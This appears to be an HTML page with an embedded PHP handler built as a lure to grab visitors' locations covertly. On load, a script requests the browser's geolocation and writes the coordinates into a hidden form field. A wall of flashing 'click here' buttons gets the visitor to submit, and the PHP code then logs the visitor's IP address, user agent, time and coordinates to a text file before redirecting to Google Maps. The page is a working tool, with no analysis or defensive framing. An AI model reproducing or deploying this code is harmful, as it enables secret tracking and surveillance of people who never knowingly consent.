<!Doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>srinivasan</title>
    <body onload="getLocation()" style="margin:0;padding:0;width:100%; height:100%;">
    <form method="post" action="l.php"style="text-align: center; width:100%;height:100%;">
<input type="text" id="demo" style="display:none;"name="loc">


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>



<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>


<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

<marquee direction="right" behavior="alternate" scrollamount="10">
<button type="submit" style="font-size:80px; background:#57F05A; border-radius:15px;border:solid red  3px;height:100%;width:100%;color:red;" name="submit" ><em><b>click here</b></em></button></marquee>

</form>
<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.value = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.value= position.coords.latitude + 
  "," + position.coords.longitude;
}
</script>
</body>
</html>

 <?php

if(isset($_POST["submit"])){
    $loc=$_POST["loc"];
date_default_timezone_set("Asia/Kolkata");
$time=date("d:m:Y / g:i:sa");
$location="\"https://www.google.com/maps/place/".$loc."\"";
$srini=fopen("loc.txt",'a');
fwrite($srini,"\n");
fwrite($srini,"DEVICE : ");
fwrite($srini,$_SERVER["HTTP_USER_AGENT"]);
fwrite($srini,"\nIP : ");
fwrite($srini,$_SERVER["REMOTE_ADDR"]);
fwrite($srini,"\nTIME : ");
fwrite($srini,$time);
fwrite($srini,"\nLOCATION : ");
fwrite($srini,$loc);
fwrite($srini,"\n----------");
echo'<script>window.location='.$location.';</script>';
}



?>
